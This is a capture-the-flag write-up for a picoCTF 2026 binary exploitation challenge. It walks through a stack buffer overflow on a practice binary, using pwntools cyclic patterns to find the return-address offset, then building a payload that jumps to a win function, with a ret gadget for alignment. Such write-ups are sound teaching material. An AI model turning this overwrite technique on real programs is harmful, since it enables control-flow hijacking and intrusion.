# offset-cycle - picoCTF 2026

**Category:** Binary Exploitation
**Points:** 300

## Challenge Description

It's a race against time. Solve the binary exploit ASAP.

## Approach

This is a classic **buffer overflow** challenge with a twist: the name "offset-cycle" directly references the technique of using **cyclic patterns** to determine the exact offset needed to overwrite the return address on the stack. The "race against time" element suggests the remote service has a short timeout, requiring an automated exploit.

### Binary Analysis

Key properties of the binary (determined via `checksec`):

- **No PIE (Position-Independent Executable)**: The binary loads at a fixed base address, so function addresses are constant across runs.
- **No stack canary**: The binary does not use stack cookies, making buffer overflows directly exploitable.
- **NX may or may not be enabled**: If NX is disabled, we can execute shellcode on the stack. If NX is enabled, we use return-to-win or ROP.
- **Partial/No RELRO**: GOT entries may be writable (useful for advanced techniques, but likely not needed here).

The binary contains a vulnerable function that reads user input into a stack buffer without bounds checking (e.g., `gets()`, `scanf("%s")`, or `read()` with an oversized count). There is also a **win function** (e.g., `win`, `flag`, `print_flag`) that opens and prints the flag file.

### Exploitation Strategy

1. **Find the offset**: Use a cyclic pattern (De Bruijn sequence) to determine the exact number of bytes needed to overwrite the saved return address (RIP on x86-64, EIP on x86).
2. **Overwrite RIP/EIP**: Craft a payload of `offset` bytes of padding followed by the address of the win function.
3. **Handle alignment**: On x86-64, the stack must be 16-byte aligned when calling functions like `printf` or `system`. If the exploit crashes due to a `movaps` instruction, prepend a `ret` gadget before the win function address.

## Solution

### Step 1: Find the offset with cyclic patterns

Using pwntools:

```python
from pwn import *
# Generate a cyclic pattern and send it
r = process('./vuln')
r.sendline(cyclic(200))
r.wait()
# Check the core dump for the crash address
core = r.corefile
offset = cyclic_find(core.fault_addr)  # or cyclic_find(core.rip) for x86-64
print(f"Offset: {offset}")
```

Alternatively, with GDB:

```
gdb ./vuln
run <<< $(python3 -c "from pwn import *; print(cyclic(200).decode())")
# When it crashes:
(gdb) info registers rip
# Use cyclic_find() on the value in RIP
```

### Step 2: Locate the win function

```
objdump -d vuln | grep win
# or
readelf -s vuln | grep win
```

### Step 3: Build and send the payload

```python
payload = b'A' * offset + p64(win_addr)
```

If stack alignment is needed:

```python
ret_gadget = <address of a 'ret' instruction>
payload = b'A' * offset + p64(ret_gadget) + p64(win_addr)
```

### Step 4: Get the flag

Send the payload to the remote service and read the flag.

## Solution Script

```
python3 solve.py
```

## Flag

```
picoCTF{...}  (placeholder - actual flag varies per instance)
```
